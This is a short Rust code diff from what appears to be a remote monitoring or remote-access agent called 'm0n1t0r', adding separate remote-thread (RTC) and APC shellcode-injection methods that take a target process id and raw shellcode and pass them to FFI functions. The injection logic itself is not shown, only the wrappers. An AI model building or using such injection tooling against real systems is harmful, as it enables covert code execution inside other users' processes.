@@ -71,7 +71,7 @@ impl m0n1t0r_common::process::Agent for AgentObj {
         Ok((stdin_tx, stdout_rx, stderr_rx))
     }
 
-    async fn inject_shellcode_by_id(
+    async fn inject_shellcode_by_id_rtc(
         &self,
         pid: u32,
         shellcode: Vec<u8>,
@@ -81,7 +81,25 @@ impl m0n1t0r_common::process::Agent for AgentObj {
         let (tx, rx) = oneshot::channel();
 
         thread::spawn(move || {
-            let _ = tx.send(ffi::inject_shellcode_by_id(
+            let _ = tx.send(ffi::inject_shellcode_by_id_rtc(
+                pid, shellcode, ep_offset, parameter,
+            )?);
+            Ok::<_, anyhow::Error>(())
+        });
+        Ok(rx.await?.into())
+    }
+
+    async fn inject_shellcode_by_id_apc(
+        &self,
+        pid: u32,
+        shellcode: Vec<u8>,
+        ep_offset: u32,
+        parameter: Vec<u8>,
+    ) -> AppResult<()> {
+        let (tx, rx) = oneshot::channel();
+
+        thread::spawn(move || {
+            let _ = tx.send(ffi::inject_shellcode_by_id_apc(
                 pid, shellcode, ep_offset, parameter,
             )?);
             Ok::<_, anyhow::Error>(())
@@ -110,7 +128,14 @@ mod ffi {
 
         fn execute(command: String, args: Vec<String>) -> Result<Output>;
 
-        fn inject_shellcode_by_id(
+        fn inject_shellcode_by_id_rtc(
+            pid: u32,
+            shellcode: Vec<u8>,
+            ep_offset: u32,
+            parameter: Vec<u8>,
+        ) -> Result<()>;
+
+        fn inject_shellcode_by_id_apc(
             pid: u32,
             shellcode: Vec<u8>,
             ep_offset: u32,
